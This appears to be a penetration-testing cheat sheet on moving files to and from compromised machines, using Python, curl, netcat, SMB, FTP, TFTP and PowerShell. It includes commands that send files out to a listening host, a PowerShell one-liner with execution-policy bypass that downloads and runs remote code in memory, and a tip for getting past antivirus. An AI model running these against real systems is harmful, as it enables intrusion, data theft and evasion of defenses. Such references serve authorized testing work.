# General - File Transfer

### Server side

The following tools can be used to host files server side.

###### Python - Web Server

```python
python -m SimpleHTTPServer <PORT>
```

###### curl

```bash
# Needs the receiver to be listening
curl -F 'data=@<FILE>' http://<IP>:<PORT>
```

###### nc

```bash
# Needs the receiver to be listening
nc -w 3 <IP> <PORT> < <FILE>
Get-Content <FILE> | ./nc.exe -w 3 <IP> <PORT>
```

###### impacket-smbserver - SMB share

```bash
impacket-smbserver <SHARE_NAME> <SHARE_PATH>
impacket-smbserver <SHARE_NAME> `pwd`
```

###### FTP

```
# pip install pyftpdlib
python -m pyftpdlib -w -p <PORT>
```

###### TFTP

```
# Metasploit server module
use auxiliary/server/tftp

# Unix daemon
mkdir <TFTPFOLDER>
atftpd --daemon --port <PORT> <TFTPFOLDER>
```

### Client side

The following tools can be used to download file from a server client side.  

File transfer is easier on Linux machines as wget, curl or netcat are often packaged
with the operating system distribution.  

On Windows machines, the process is usually not as straight forward.

###### wget

```bash
wget http:/<IP>:<PORT>/<FILE>
wget -O file http://<IP>:<PORT>t/<FILE>
wget -r --no-parent -nH --reject "index.html*" http://<IP>:<PORT>/<DIR>
```

###### curl

```bash
curl http://<IP>:<PORT>/<FILE> > out.file
curl -O http://<IP>:<PORT>/<FILE>
```

###### netcat

```bash
nc -l -p <PORT> > out.file
nc -l -p <PORT> | tee out.file
```

###### Python

```python
python -c "from urllib import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', '<OUT.FILE>')"
python3 -c "from urllib.request import urlretrieve; urlretrieve('http://<IP>:<PORT>/<FILE>', 'out.file')"
```

###### Powershell

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <FILE>
(New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', '<FULLPATH\FILENAME>');

# Load in memory and execute
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>'); Invoke-ImportedCMD"
echo IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>') | powershell -nop -exec bypass -

# Connect to a SMB share
New-PSDrive -Name "LocalMountedFolder" -PSProvider "FileSystem" -Root "\\<IP>\<SHARE>"; cd LocalMountedFolder:
```

###### FTP

To download file interactively:

```
ftp -A <SERVERIP>
```

Paste the following commands into a remote Windows shell and download files over FTP non-interactively (replace <USERNAME> by anonymous if using anonymous login):

```
echo open <IP> <PORT> > ftp.txt
echo USER <USERNAME> >> ftp.txt
echo <PASSWORD> >> ftp.txt
echo bin >> ftp.txt
echo GET <FILENAME> >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

In case of AV errors while trying to download a binary, omit the exe extension.  

###### TFTP

TFTP is a simple protocol for transferring files, implemented on top of the UDP/IP
protocols. TFTP was designed to be small and easy to implement, and therefore it
lacks most of the advanced features offered by more robust file transfer protocols.
TFTP only reads and writes files from or to a remote server. It cannot list, delete,
or rename files or directories and it has no provisions for user authentication.  

Windows operating systems up to Windows XP and 2003 contain a TFTP
client, by default. In Windows 7, 2008, and above, this tool needs to be explicitly added,
during installation.

```
tftp -i <SERVERIP> GET <FILENAME>
```
